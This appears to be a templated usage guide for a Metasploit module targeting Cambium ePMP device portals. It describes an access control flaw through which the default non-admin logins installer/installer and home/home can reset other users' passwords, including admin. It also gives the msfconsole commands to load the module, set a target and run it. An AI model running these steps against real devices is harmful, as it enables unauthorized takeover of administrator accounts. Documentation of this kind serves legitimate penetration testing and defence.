**The description of current metasploit exploit**
This module exploits an access control vulnerability in Cambium ePMP          device management portal. It requires any one of the following non-admin login          credentials - installer/installer, home/home - to reset password of other          existing user(s) including 'admin'. All versions <=3.5 are affected. This          module works on versions 3.0-3.5-RC7.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/epmp1000_reset_pass
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.